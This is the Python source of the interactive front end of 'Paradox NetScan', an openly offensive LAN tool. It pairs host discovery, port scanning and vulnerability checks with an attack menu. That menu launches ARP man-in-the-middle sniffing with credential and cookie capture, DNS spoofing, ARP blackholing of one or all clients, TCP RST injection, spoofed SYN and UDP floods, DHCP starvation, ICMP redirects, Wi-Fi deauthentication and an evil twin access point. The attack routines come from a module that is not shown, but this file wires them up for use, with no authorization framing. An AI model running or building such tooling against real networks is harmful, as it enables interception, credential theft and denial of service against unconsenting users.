#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Paradox NetScan v4.0 — discovery · assessment · attacks
Paradox Tech 2026
"""

from __future__ import annotations

import os
import sys
import time
import json
import socket
from pathlib import Path
from datetime import datetime
from typing import Optional

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.text import Text
    from rich.align import Align
    from rich.rule import Rule
    from rich.columns import Columns
    from rich.markup import escape
    from rich import box
except ImportError:
    print("[!] pip install rich")
    sys.exit(1)

sys.path.insert(0, str(Path(__file__).parent))

try:
    from paradox.core import (
        VERSION, Host, NetworkInfo,
        require_root, get_default_iface, collect_network_info,
        print_network_info, arp_scan, print_hosts, select_host,
        scan_ports, COMMON_PORTS, PORT_SERVICE,
        arp_poison, arp_blackhole, mass_arp_blackhole,
        deauth_flood, setup_monitor_mode, confirm, safe_int,
        SEV_COLOR, SEV_ORDER,
    )
    from paradox.attacks import (
        arp_mitm_sniff, dns_spoof, tcp_rst_inject,
        syn_flood, udp_flood, icmp_redirect, evil_twin, arp_storm,
        port_knock_listen, passive_discover, dhcp_starvation,
    )
except ImportError as e:
    print(f"[!] Import error: {e}")
    sys.exit(1)

console = Console()

# ─── banner ──────────────────────────────────────────────────────────────────

_BANNER_ART = r"""
██████╗  █████╗ ██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝
██████╔╝███████║██████╔╝███████║██║  ██║██║   ██║ ╚███╔╝ 
██╔═══╝ ██╔══██║██╔══██╗██╔══██║██║  ██║██║   ██║ ██╔██╗ 
██║     ██║  ██║██║  ██║██║  ██║██████╔╝╚██████╔╝██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝"""

_BANNER_COMPACT = "◈ PARADOX NETSCAN ◈"


def print_banner() -> None:
    w = console.width

    if w >= 80:
        # full ASCII art banner — color gradient line by line
        colors = ["red", "red", "bright_red", "bright_red", "dark_red", "dark_red"]
        lines  = _BANNER_ART.strip("\n").split("\n")
        art    = Text()
        for i, line in enumerate(lines):
            art.append(line + "\n", style=colors[i % len(colors)])

        tagline = Text.from_markup(
            f"[dim]  discovery  ·  assessment  ·  attacks[/dim]\n"
            f"[dim red]  v{VERSION}  ·  Paradox Tech 2026  ·  {_build_stamp()}[/dim red]"
        )

        console.print()
        console.print(Panel(
            Align.center(art + tagline),
            border_style="bold red",
            padding=(0, 2),
            expand=False,
        ))
    else:
        # narrow terminal — compact single-line banner
        console.print()
        console.print(Panel(
            Align.center(Text.from_markup(
                f"[bold red]{_BANNER_COMPACT}[/bold red]\n"
                f"[dim]v{VERSION}  ·  Paradox Tech 2026[/dim]"
            )),
            border_style="red",
            padding=(0, 1),
            expand=False,
        ))

    console.print()


def _build_stamp() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M")


# ─── menu definitions ─────────────────────────────────────────────────────────

MENU_DISCOVERY = [
    ("1",  "ARP Discovery",       "Find all live hosts — ARP + cache"),
    ("2",  "Passive Discovery",   "Silent · ARP/mDNS/DHCP watch, zero send"),
    ("3",  "ARP Storm",           "Flood subnet, fastest discovery"),
    ("4",  "Host Details",        "Full info on a selected host"),
    ("5",  "Port Scan (common)",  "Well-known ports"),
    ("6",  "Port Scan (full)",    "All 65535 — slow"),
    ("7",  "Security Assessment", "Vuln + CVE + banner analysis"),
    ("8",  "Network Info",        "Interface · gateway · subnet"),
]

MENU_ATTACKS = [
    ("A1",  "ARP MITM + Sniffer",  "MITM · HTTP/DNS/TLS-SNI/Cookie/Cred capture"),
    ("A2",  "DNS Spoof",           "Redirect domains · catch-all mode"),
    ("A3",  "ARP Blackhole",       "Kill internet for one host"),
    ("A4",  "Mass Blackhole",      "Kill all LAN clients at once"),
    ("A5",  "TCP RST Inject",      "Terminate active TCP flows w/ seq predict"),
    ("A6",  "SYN Flood",           "Multi-thread raw SYN · real pps tracking"),
    ("A7",  "UDP Flood",           "Raw UDP bandwidth exhaustion"),
    ("A8",  "DHCP Starvation",     "Exhaust server pool · random spoofed MACs"),
    ("A9",  "ICMP Redirect",       "Reroute traffic via ICMP type-5"),
    ("A10", "Deauth (Wi-Fi)",      "802.11 deauth flood · monitor mode"),
    ("A11", "Evil Twin AP",        "Fake AP clone · hostapd+dnsmasq"),
    ("AK",  "Port Knock Detector", "Passive · detect knock sequences on wire"),
]

MENU_OTHER = [
    ("E",  "Export Report",  "Save findings to JSON"),
    ("Q",  "Quit",           ""),
]


def _menu_section(title: str, rows: list, key_width: int = 4) -> Table:
    t = Table(
        box=None, show_header=False,
        padding=(0, 1), expand=False, show_edge=False,
    )
    t.add_column("Key",    style="bold cyan",  width=key_width + 1)
    t.add_column("Action", style="bold white",  min_width=22)
    t.add_column("Note",   style="dim",         min_width=0)
    t.add_row(f"[dim]─── {title} ───[/dim]", "", "")
    for key, action, note in rows:
        t.add_row(f"[cyan]\[{key}][/cyan]", action, note)
    return t


def print_menu(hosts: list, iface: str, net: Optional[NetworkInfo]) -> None:
    w = console.width

    # status bar
    parts = [f"iface [cyan]{iface}[/cyan]"]
    if net and net.our_ip:
        parts.append(f"ip [green]{net.our_ip}[/green]")
    if net and net.ssid and net.ssid != "unknown":
        parts.append(f"ssid [yellow]{net.ssid}[/yellow]")
    if hosts:
        parts.append(f"hosts [bold yellow]{len(hosts)}[/bold yellow]")
    status = "  ·  ".join(parts)

    disc_t  = _menu_section("DISCOVERY", MENU_DISCOVERY, key_width=3)
    atk_t   = _menu_section("ATTACKS",   MENU_ATTACKS,   key_width=4)
    other_t = _menu_section("OTHER",     MENU_OTHER,     key_width=2)

    if w >= 120:
        # side-by-side layout
        combined = Table(box=None, show_header=False, padding=0, expand=False)
        combined.add_column(min_width=0)
        combined.add_column(min_width=0)
        combined.add_row(disc_t, atk_t)
        combined.add_row(other_t, "")
    elif w >= 80:
        # stacked, attacks below discovery
        combined = Table(box=None, show_header=False, padding=(0, 0), expand=False)
        combined.add_column(min_width=0)
        combined.add_row(disc_t)
        combined.add_row(atk_t)
        combined.add_row(other_t)
    else:
        # narrow: minimal — keys + action only, no notes
        combined = Table(box=None, show_header=False, padding=(0, 0), expand=False)
        combined.add_column(min_width=0)
        for section_rows, title in [
            (MENU_DISCOVERY, "DISC"),
            (MENU_ATTACKS,   "ATK"),
            (MENU_OTHER,     ""),
        ]:
            combined.add_row(f"[dim]── {title} ──[/dim]")
            for key, action, _ in section_rows:
                combined.add_row(f"[cyan]\[{key}][/cyan] [white]{action}[/white]")

    console.print(Panel(
        combined,
        title=f"[bold red]NETSCAN[/bold red]  [dim]{status}[/dim]",
        border_style="dim red",
        padding=(0, 1),
        expand=(w >= 80),
    ))


# ─── host detail ──────────────────────────────────────────────────────────────

def print_host_detail(host: Host) -> None:
    w = console.width

    info = Table(box=box.SIMPLE, show_header=False, padding=(0, 1), expand=False)
    info.add_column("Field", style="bold cyan", min_width=12)
    info.add_column("Value", style="white")

    rc = SEV_COLOR.get(host.risk_label, "dim")
    for lbl, val in [
        ("IP",        host.ip),
        ("MAC",       host.mac),
        ("Vendor",    host.vendor),
        ("Hostname",  host.hostname),
        ("OS Guess",  host.os_guess),
        ("TTL",       str(host.ttl) if host.ttl else "—"),
        ("RTT",       f"{host.rtt_ms:.1f} ms" if host.rtt_ms else "—"),
        ("Risk",      f"[{rc}]{host.risk_label}  (score: {host.risk_score})[/{rc}]"),
    ]:
        info.add_row(lbl, val)

    console.print(Panel(
        info,
        title=f"[bold green]{host.ip}[/bold green]  [dim]{host.mac}[/dim]",
        border_style="green", expand=False,
    ))

    if host.open_ports:
        pt = Table(
            title="[bold]Open Ports[/bold]",
            box=box.ROUNDED, expand=(w > 100),
            show_header=True, header_style="bold dim",
        )
        pt.add_column("Port",    style="bold cyan",  width=7,  justify="right")
        pt.add_column("Service", style="yellow",     width=16)
        pt.add_column("Banner",  style="dim",        min_width=0)
        for port, banner in sorted(host.open_ports.items()):
            svc = PORT_SERVICE.get(port, "?")
            pt.add_row(str(port), svc, escape(banner[:100]) if banner else "—")
        console.print(pt)

    if host.findings:
        ft = Table(
            title="[bold]Security Findings[/bold]",
            box=box.ROUNDED, expand=(w > 100),
            show_header=True, header_style="bold dim",
        )
        ft.add_column("Severity",  width=10)
        ft.add_column("Finding",   style="white",    min_width=0)
        ft.add_column("CVE",       style="dim cyan",  width=16)
        ft.add_column("Fix",       style="dim",       min_width=0)
        for f in sorted(
            host.findings,
            key=lambda x: SEV_ORDER.index(x["severity"]) if x["severity"] in SEV_ORDER else 0,
            reverse=True,
        ):
            c = SEV_COLOR.get(f["severity"], "white")
            ft.add_row(
                f"[{c}]{f['severity']}[/{c}]",
                f["description"],
                f.get("cve") or "—",
                (f.get("remediation") or "")[:60] or "—",
            )
        console.print(ft)


# ─── security assessment ──────────────────────────────────────────────────────

DANGEROUS_PORTS = {
    21:    ("FTP cleartext",                    "MEDIUM",   "Switch to SFTP/FTPS",                ""),
    23:    ("Telnet — no encryption",           "HIGH",     "Replace with SSH",                   "CVE-2023-23638"),
    25:    ("SMTP open relay risk",             "MEDIUM",   "Restrict relay, enable auth",        ""),
    53:    ("DNS open resolver",                "MEDIUM",   "Restrict to LAN or disable",         "CVE-2023-50387"),
    110:   ("POP3 cleartext",                   "MEDIUM",   "Use POP3S / port 995",               ""),
    143:   ("IMAP cleartext",                   "MEDIUM",   "Use IMAPS / port 993",               ""),
    445:   ("SMB exposed",                      "HIGH",     "Firewall, patch immediately",        "CVE-2017-0144"),
    1433:  ("MSSQL exposed",                    "HIGH",     "Bind localhost or firewall",         "CVE-2020-0618"),
    1521:  ("Oracle DB exposed",                "HIGH",     "Firewall + strong auth",             ""),
    2375:  ("Docker API — unauthenticated",     "CRITICAL", "Add TLS + socket auth NOW",          "CVE-2019-5736"),
    2376:  ("Docker TLS — verify cert chain",   "MEDIUM",   "Verify mutual TLS config",           ""),
    2379:  ("etcd — cluster data exposed",      "CRITICAL", "Firewall from public, add auth",     "CVE-2020-15106"),
    3306:  ("MySQL/MariaDB exposed",            "HIGH",     "Bind to 127.0.0.1",                  "CVE-2021-27928"),
    3389:  ("RDP exposed",                      "HIGH",     "VPN-gate, disable NLA off",          "CVE-2019-0708"),
    5432:  ("PostgreSQL exposed",               "HIGH",     "Bind localhost + pg_hba.conf",       ""),
    5601:  ("Kibana exposed",                   "HIGH",     "Add auth, firewall from internet",   "CVE-2019-7609"),
    5900:  ("VNC exposed",                      "MEDIUM",   "Tunnel over SSH, strong password",   "CVE-2022-27596"),
    6379:  ("Redis — likely unauthenticated",   "CRITICAL", "requirepass in redis.conf",          "CVE-2022-0543"),
    6443:  ("Kubernetes API server",            "HIGH",     "mTLS + RBAC, never expose public",  ""),
    7001:  ("WebLogic exposed",                 "CRITICAL", "Patch immediately",                  "CVE-2023-21839"),
    8080:  ("HTTP proxy / dev server",          "LOW",      "Verify intent, auth if public",      ""),
    8888:  ("Jupyter notebook",                 "CRITICAL", "Add password, bind localhost",        "CVE-2022-24758"),
    9000:  ("PHP-FPM / Portainer",              "HIGH",     "Firewall from internet",             ""),
    9090:  ("Prometheus metrics exposed",       "MEDIUM",   "Add auth or firewall",               ""),
    9200:  ("Elasticsearch unauthenticated",    "HIGH",     "Enable X-Pack security",             "CVE-2021-22132"),
    10250: ("kubelet API exposed",              "CRITICAL", "Firewall, check anonymous auth",     "CVE-2022-3294"),
    11211: ("Memcached open",                   "MEDIUM",   "Bind to localhost",                  "CVE-2018-1000115"),
    27017: ("MongoDB open",                     "HIGH",     "auth=true + bind_ip localhost",      "CVE-2021-32030"),
}

BANNER_SIGS = {
    6379:  [("redis_server",       "CRITICAL", "Redis: no auth required")],
    9200:  [('"cluster_name"',     "HIGH",     "Elasticsearch: responds unauthed")],
    8888:  [("jupyter",            "CRITICAL", "Jupyter: notebook accessible")],
    21:    [("vsftpd 2.3.4",       "CRITICAL", "FTP: vsftpd backdoor (CVE-2011-2523)", "CVE-2011-2523"),
            ("ProFTPD 1.3.3",      "HIGH",     "FTP: ProFTPD SQLi risk")],
    22:    [("OpenSSH_7.2",        "MEDIUM",   "SSH: outdated version"),
            ("OpenSSH_6.",         "HIGH",     "SSH: very old — many known CVEs")],
    80:    [("Apache/2.2",         "MEDIUM",   "HTTP: EOL Apache 2.2"),
            ("Apache/2.4.49",      "CRITICAL", "HTTP: Path traversal CVE-2021-41773", "CVE-2021-41773"),
            ("IIS/6.0",            "CRITICAL", "HTTP: EOL IIS 6.0 — CVE-2017-7269",  "CVE-2017-7269"),
            ("PHP/5.",             "HIGH",     "HTTP: EOL PHP 5.x in use"),
            ("PHP/7.0",            "HIGH",     "HTTP: EOL PHP 7.0 in use")],
    3389:  [("MS-RDP",             "MEDIUM",   "RDP: check BlueKeep patching")],
    5432:  [("PostgreSQL 9.",      "HIGH",     "PG: EOL version in use")],
    7001:  [("weblogic",           "CRITICAL", "WebLogic: check for recent CVEs")],
}


def run_assessment(host: Host) -> None:
    host.findings  = []
    host.risk_score = 0

    with Progress(
        SpinnerColumn(style="bold red"),
        TextColumn("[bold white]{task.description}"),
        transient=True,
    ) as prog:
        tid = prog.add_task("Checking dangerous ports …", total=None)

        for port, entry in DANGEROUS_PORTS.items():
            desc, sev, rem, cve = entry
            if port in host.open_ports:
                host.add_finding(desc, sev, rem, cve)

        prog.update(tid, description="Analysing banners …")
        for port, sigs in BANNER_SIGS.items():
            banner = (host.open_ports.get(port) or "").lower()
            if not banner:
                continue
            for sig in sigs:
                marker = sig[0].lower()
                sev    = sig[1]
                msg    = sig[2]
                cve    = sig[3] if len(sig) > 3 else ""
                if marker in banner:
                    host.add_finding(msg, sev, "Patch or upgrade this service", cve)

        prog.update(tid, description="Checking Telnet auth …")
        if 23 in host.open_ports:
            b = (host.open_ports[23] or "").lower()
            if any(tok in b for tok in ("login", "password", "user")):
                host.add_finding(
                    "Telnet login prompt visible in banner", "CRITICAL",
                    "Disable Telnet, use SSH", "CVE-2023-23638",
                )

        prog.update(tid, description="Checking FTP anonymous …")
        if 21 in host.open_ports:
            try:
                s = socket.socket()
                s.settimeout(2)
                s.connect((host.ip, 21))
                s.recv(1024)
                s.sendall(b"USER anonymous\r\n")
                r = s.recv(1024).decode("utf-8", errors="ignore")
                if "331" in r or "230" in r:
                    s.sendall(b"PASS anon@\r\n")
                    r2 = s.recv(1024).decode("utf-8", errors="ignore")
                    if "230" in r2:
                        host.add_finding(
                            "FTP anonymous login accepted", "HIGH",
                            "Disable anonymous FTP", "",
                        )
                s.close()
            except Exception:
                pass

        prog.update(tid, description="Checking Redis auth …")
        if 6379 in host.open_ports:
            banner = (host.open_ports[6379] or "").lower()
            if "+pong" in banner:
                host.add_finding(
                    "Redis PING responded without auth", "CRITICAL",
                    "Set requirepass in redis.conf; bind to 127.0.0.1", "CVE-2022-0543",
                )

        prog.update(tid, description="Checking Docker API …")
        if 2375 in host.open_ports:
            try:
                s = socket.socket()
                s.settimeout(2)
                s.connect((host.ip, 2375))
                s.sendall(b"GET /_ping HTTP/1.0\r\nHost: x\r\n\r\n")
                r = s.recv(512).decode("utf-8", errors="ignore")
                s.close()
                if "200 OK" in r:
                    host.add_finding(
                        "Docker API responds unauthenticated — full container control",
                        "CRITICAL",
                        "Add TLS client auth, bind to socket only",
                        "CVE-2019-5736",
                    )
            except Exception:
                pass

        prog.update(tid, description="Done.")

    rc = SEV_COLOR.get(host.risk_label, "dim")
    console.print(Panel(
        f"Findings   : [yellow]{len(host.findings)}[/yellow]\n"
        f"Risk score : [{rc}]{host.risk_score}[/{rc}]  [{rc}]{host.risk_label}[/{rc}]",
        title="[bold]Assessment Complete[/bold]",
        border_style="dim green", expand=False,
    ))
    print_host_detail(host)


# ─── DNS spoof helper ─────────────────────────────────────────────────────────

def _build_spoof_map() -> tuple[dict[str, str], Optional[str]]:
    console.print(Panel(
        "[dim]Format: domain=ip  (e.g. google.com=192.168.1.5)\n"
        "Wildcard prefix: *.example.com=ip\n"
        "Catch-all: *=ip  (redirects ALL DNS queries)\n"
        "Empty line to finish.[/dim]",
        title="[bold]DNS Spoof Rules[/bold]",
        border_style="dim", expand=False,
    ))
    spoof_map: dict[str, str] = {}
    catch_all: Optional[str]  = None

    while True:
        line = Prompt.ask("[dim]domain=ip[/dim]  (empty to finish)", default="").strip()
        if not line:
            break
        if "=" not in line:
            console.print("[red]Format: domain=ip[/red]")
            continue
        domain, ip = line.split("=", 1)
        domain = domain.strip()
        ip     = ip.strip()
        if domain == "*":
            catch_all = ip
            console.print(f"  [bold red]CATCH-ALL[/bold red] → {ip}")
        else:
            spoof_map[domain] = ip
            console.print(f"  [green]+[/green] {domain} → {ip}")

    return spoof_map, catch_all


# ─── export ───────────────────────────────────────────────────────────────────

def export_report(hosts: list, net: Optional[NetworkInfo]) -> None:
    if not hosts:
        console.print("[red]No hosts to export.[/red]")
        return
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"paradox_report_{ts}.json"
    data  = {
        "tool":       "Paradox NetScan",
        "version":    VERSION,
        "generated":  datetime.now().isoformat(),
        "interface":  getattr(net, "iface", ""),
        "subnet":     getattr(net, "subnet_cidr", ""),
        "gateway":    getattr(net, "gateway_ip", ""),
        "host_count": len(hosts),
        "hosts": [
            {
                "ip":          h.ip,
                "mac":         h.mac,
                "vendor":      h.vendor,
                "hostname":    h.hostname,
                "os_guess":    h.os_guess,
                "ttl":         h.ttl,
                "rtt_ms":      h.rtt_ms,
                "open_ports":  {str(k): v for k, v in h.open_ports.items()},
                "risk_score":  h.risk_score,
                "risk_label":  h.risk_label,
                "findings":    h.findings,
            }
            for h in hosts
        ],
    }
    Path(fname).write_text(json.dumps(data, indent=2))
    console.print(Panel(
        f"[green]Saved → [bold]{fname}[/bold][/green]\n"
        f"[dim]{len(hosts)} hosts  ·  "
        f"{sum(len(h.findings) for h in hosts)} findings[/dim]",
        border_style="dim green", expand=False,
    ))


# ─── main ─────────────────────────────────────────────────────────────────────

def main() -> None:
    print_banner()

    iface  = get_default_iface()
    custom = Prompt.ask(
        f"Interface [dim](enter for [cyan]{iface}[/cyan])[/dim]",
        default=iface,
    )
    iface = custom.strip() or iface
    console.print()

    net:   Optional[NetworkInfo] = None
    hosts: list[Host]            = []

    while True:
        console.print()
        print_menu(hosts, iface, net)
        choice = Prompt.ask("[bold cyan]>[/bold cyan]", default="Q").strip().upper()

        # ── DISCOVERY ────────────────────────────────────────────────────────

        if choice == "Q":
            console.print(Panel(
                "[bold red]Paradox NetScan — session ended[/bold red]",
                border_style="dim red", expand=False,
            ))
            break

        elif choice == "1":
            require_root()
            if net is None:
                net = collect_network_info(iface)
            cidr  = Prompt.ask("CIDR", default=net.subnet_cidr)
            hosts = arp_scan(cidr, iface)
            if hosts:
                print_hosts(hosts)

        elif choice == "2":
            timeout = safe_int(Prompt.ask("Listen duration (seconds)", default="30"))
            results = passive_discover(iface, timeout)
            for r in results:
                if any(h.ip == r["ip"] for h in hosts):
                    continue
                hosts.append(Host(
                    ip=r["ip"], mac=r.get("mac") or "unknown",
                    hostname=r.get("hostname") or "unknown",
                ))

        elif choice == "3":
            require_root()
            if net is None:
                net = collect_network_info(iface)
            cidr = Prompt.ask("CIDR", default=net.subnet_cidr)
            live = arp_storm(cidr, iface)
            console.print(f"[green][+] Storm found {len(live)} alive hosts[/green]")

        elif choice == "4":
            host = select_host(hosts)
            if host:
                print_host_detail(host)

        elif choice == "5":
            host = select_host(hosts)
            if host:
                scan_ports(host, COMMON_PORTS)
                print_host_detail(host)

        elif choice == "6":
            host = select_host(hosts)
            if host:
                console.print("[yellow][*] Full scan — may take several minutes[/yellow]")
                scan_ports(host, list(range(1, 65536)))
                print_host_detail(host)

        elif choice == "7":
            host = select_host(hosts)
            if host:
                if not host.open_ports:
                    console.print("[yellow][*] No ports scanned — running common scan first[/yellow]")
                    scan_ports(host, COMMON_PORTS)
                run_assessment(host)

        elif choice == "8":
            net = collect_network_info(iface)
            print_network_info(net)

        # ── ATTACKS ──────────────────────────────────────────────────────────

        elif choice == "A1":
            require_root()
            if net is None:
                net = collect_network_info(iface)
            victim = select_host(hosts)
            if not victim:
                continue
            gw = Prompt.ask("Gateway IP", default=net.gateway_ip or "")
            if not gw:
                continue
            show_http  = Prompt.ask("Capture HTTP?   (y/n)", default="y").lower() == "y"
            show_dns   = Prompt.ask("Capture DNS?    (y/n)", default="y").lower() == "y"
            show_creds = Prompt.ask("Capture creds?  (y/n)", default="y").lower() == "y"
            arp_mitm_sniff(victim.ip, gw, iface, show_http, show_dns, show_creds)

        elif choice == "A2":
            require_root()
            if net is None:
                net = collect_network_info(iface)
            victim = select_host(hosts)
            if not victim:
                continue
            gw = Prompt.ask("Gateway IP", default=net.gateway_ip or "")
            if not gw:
                continue
            spoof_map, catch_all = _build_spoof_map()
            if not spoof_map and not catch_all:
                console.print("[red]No rules — aborting.[/red]")
                continue
            dns_spoof(victim.ip, gw, iface, spoof_map, catch_all)

        elif choice == "A3":
            require_root()
            if net is None:
                net = collect_network_info(iface)
            victim = select_host(hosts)
            if not victim:
                continue
            gw  = Prompt.ask("Gateway IP", default=net.gateway_ip or "")
            dur = safe_int(Prompt.ask("Duration secs (0=∞)", default="0"))
            if gw:
                arp_blackhole(victim.ip, gw, iface, dur)

        elif choice == "A4":
            require_root()
            if net is None:
                net = collect_network_info(iface)
            if not hosts:
                console.print("[red]No hosts — run discovery first.[/red]")
                continue
            gw = Prompt.ask("Gateway IP", default=net.gateway_ip or "")
            if gw and confirm("Mass blackhole ALL clients?"):
                mass_arp_blackhole(hosts, gw, iface)

        elif choice == "A5":
            require_root()
            victim = select_host(hosts)
            if not victim:
                continue
            port_raw = Prompt.ask("Target port (0 = kill ALL)", default="0")
            port     = safe_int(port_raw)
            cont     = Prompt.ask("Continuous injection? (y/n)", default="n").lower() == "y"
            tcp_rst_inject(victim.ip, iface, port, cont)

        elif choice == "A6":
            if net is None:
                net = collect_network_info(iface)
            target_ip   = Prompt.ask("Target IP")
            target_port = safe_int(Prompt.ask("Target port", default="80"))
            spoof       = Prompt.ask("Spoof source IPs? (y/n)", default="y").lower() == "y"
            pps         = safe_int(Prompt.ask("Packets per second", default="1000"))
            threads     = safe_int(Prompt.ask("Sender threads", default="4"))
            dur         = safe_int(Prompt.ask("Duration secs (0=∞)", default="0"))
            if target_ip and target_port:
                syn_flood(target_ip, target_port, spoof, pps, dur, threads)

        elif choice == "A7":
            target_ip   = Prompt.ask("Target IP")
            target_port = safe_int(Prompt.ask("Target port", default="53"))
            payload_sz  = safe_int(Prompt.ask("Payload bytes", default="1024"))
            pps         = safe_int(Prompt.ask("Packets per second", default="1000"))
            dur         = safe_int(Prompt.ask("Duration secs (0=∞)", default="0"))
            spoof       = Prompt.ask("Spoof source? (y/n)", default="y").lower() == "y"
            if target_ip and target_port:
                udp_flood(target_ip, target_port, payload_sz, pps, dur, spoof)

        elif choice == "A8":
            require_root()
            count = safe_int(Prompt.ask("DISCOVER packets to send", default="256"))
            delay = float(Prompt.ask("Delay between requests (seconds)", default="0.05"))
            dhcp_starvation(iface, count, delay)

        elif choice == "A9":
            require_root()
            if net is None:
                net = collect_network_info(iface)
            victim = select_host(hosts)
            if not victim:
                continue
            gw      = Prompt.ask("Real gateway IP", default=net.gateway_ip or "")
            fake_gw = Prompt.ask("Redirect traffic to", default=net.our_ip or "")
            if gw:
                icmp_redirect(victim.ip, gw, iface, fake_gw)

        elif choice == "A10":
            require_root()
            mon = setup_monitor_mode(iface)
            if not mon:
                continue
            bssid  = Prompt.ask("AP BSSID")
            client = Prompt.ask("Client MAC (broadcast=ff:ff:ff:ff:ff:ff)",
                                default="ff:ff:ff:ff:ff:ff")
            count  = safe_int(Prompt.ask("Frame count (0=∞)", default="0"))
            deauth_flood(mon, bssid, client, count)

        elif choice == "A11":
            require_root()
            ssid    = Prompt.ask("Target SSID to clone")
            channel = safe_int(Prompt.ask("Channel", default="6"))
            gw      = Prompt.ask("Evil Twin gateway IP", default="192.168.100.1")
            dhcp    = Prompt.ask("DHCP range", default="192.168.100.10,192.168.100.50")
            evil_twin(iface, ssid, channel, gw, dhcp)

        elif choice == "AK":
            require_root()
            console.print("[dim]Enter port knock sequence (space-separated, e.g. 7000 8000 9000)[/dim]")
            raw_seq = Prompt.ask("Knock sequence", default="7000 8000 9000")
            seq     = [safe_int(p) for p in raw_seq.split() if p.strip()]
            if seq:
                port_knock_listen(iface, seq)

        elif choice == "E":
            export_report(hosts, net)

        else:
            console.print("[dim]Unknown option — check the menu.[/dim]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[dim red]Interrupted.[/dim red]")
        sys.exit(0)
